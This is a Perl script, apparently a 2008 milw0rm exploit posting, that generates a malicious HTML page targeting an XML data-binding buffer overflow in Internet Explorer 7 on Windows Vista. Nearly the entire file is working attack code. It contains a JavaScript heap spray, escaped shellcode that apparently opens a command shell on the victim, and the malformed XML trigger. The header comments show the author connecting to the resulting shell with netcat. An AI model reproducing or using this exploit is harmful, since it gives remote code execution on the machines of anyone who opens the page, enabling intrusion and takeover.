#!/usr/bin/perl
# msie_xmlbof_vista.pl
# Microsoft Internet Explorer XML Buffer Overflow Exploit
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
#
# I wanted a reliable shell, so I figured I'd whip up something nice for IE7+Vista
# Only the first hundred calculators popping up on the screen is hilarious
# Core/Concepts from other available exploits... Yeah, thanks skylined/krafy/muts
#
# bash$ perl msie_xmlbof_vista.pl
# Usage: msie_xmlbof_vista.pl <filename.html>
# bash$ perl msie_xmlbof_vista.pl /var/www/msie_xmlbof_vista.html
#
# *** Launching IE7 on Vista SP1 with URL: http://192.168.100.105/msie_xmlbof_vista.html ***
# 
# bash$ nc 192.168.100.118 30702
# Microsoft Windows [Version 6.0.6001]
# Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
#
# C:\Users\vista\Desktop>
#
# Enjoy :)

$filename = $ARGV[0];
if(!defined($filename))
{

     print "Usage: $0 <filename.html>\n";

}

$exploit = '<html>' . "\n" . '<div id="msie_xmlbof_vista">x</div>' . '<script>' . "\n\n" . 
	   'var shellcode = unescape("%u4343%u4343%u43eb%u5756%u458b%u8b3c%u0554%u0178%u52ea%u528b" + ' . "\n" .
	   '                         "%u0120%u31ea%u31c0%u41c9%u348b%u018a%u31ee%uc1ff%u13cf%u01ac" + '  . "\n" .
	   '                         "%u85c7%u75c0%u39f6%u75df%u5aea%u5a8b%u0124%u66eb%u0c8b%u8b4b" + ' . "\n" .
	   '                         "%u1c5a%ueb01%u048b%u018b%u5fe8%uff5e%ufce0%uc031%u8b64%u3040" + ' . "\n" .
	   '                         "%u408b%u8b0c%u1c70%u8bad%u0868%uc031%ub866%u6c6c%u6850%u3233" + ' . "\n" .
	   '                         "%u642e%u7768%u3273%u545f%u71bb%ue8a7%ue8fe%uff90%uffff%uef89" + ' . "\n" .
	   '                         "%uc589%uc481%ufe70%uffff%u3154%ufec0%u40c4%ubb50%u7d22%u7dab" + ' . "\n" .
	   '                         "%u75e8%uffff%u31ff%u50c0%u5050%u4050%u4050%ubb50%u55a6%u7934" + ' . "\n" .
	   '                         "%u61e8%uffff%u89ff%u31c6%u50c0%u3550%u0102%uee77%uccfe%u8950" + ' . "\n" .
	   '                         "%u50e0%u106a%u5650%u81bb%u2cb4%ue8be%uff42%uffff%uc031%u5650" + ' . "\n" .
	   '                         "%ud3bb%u58fa%ue89b%uff34%uffff%u6058%u106a%u5054%ubb56%uf347" + ' . "\n" .
	   '                         "%uc656%u23e8%uffff%u89ff%u31c6%u53db%u2e68%u6d63%u8964%u41e1" + ' . "\n" .
	   '                         "%udb31%u5656%u5356%u3153%ufec0%u40c4%u5350%u5353%u5353%u5353" + ' . "\n" .
	   '                         "%u5353%u6a53%u8944%u53e0%u5353%u5453%u5350%u5353%u5343%u534b" + ' . "\n" .
	   '                         "%u5153%u8753%ubbfd%ud021%ud005%udfe8%ufffe%u5bff%uc031%u5048" +'  . "\n" .
	   '                         "%ubb53%ucb43%u5f8d%ucfe8%ufffe%u56ff%uef87%u12bb%u6d6b%ue8d0" + ' . "\n" .
	   '                         "%ufec2%uffff%uc483%u615c%u89eb");' . "\n\n" . 'var block = unescape("%u0D0D%u0D0D");' . "\n\n" . 
	   'while (block.length < 100000) block += block;' . "\n" . 'var memory = new Array();' . "\n" . 'for (i = 0;i < 1000;i++) memory[i] += block + shellcode;' . "\n\n" . 
	   'xmlrox = "<XML id=microosuck><ie><vista><![CDATA[<img src=http://&#x0a0a;&#x0a0a;.microo.suck>]]></vista></ie></XML><SPAN datasrc=#microosuck datafld=vista dataformatas=html>' . 
	   '<XML id=microosuck></XML><SPAN datasrc=#microosuck datafld=vista dataformatas=html></SPAN></SPAN>";' . "\n\n" . 'mssox           = document.getElementById("msie_xmlbof_vista");' . 
	   "\n" . 'mssox.innerHTML = xmlrox;' . "\n\n" . '</script>' . "\n" . '</html>';

     open(FILE, '>' . $filename);
     print FILE $exploit;
     close(FILE);

exit;

# milw0rm.com [2008-12-28]
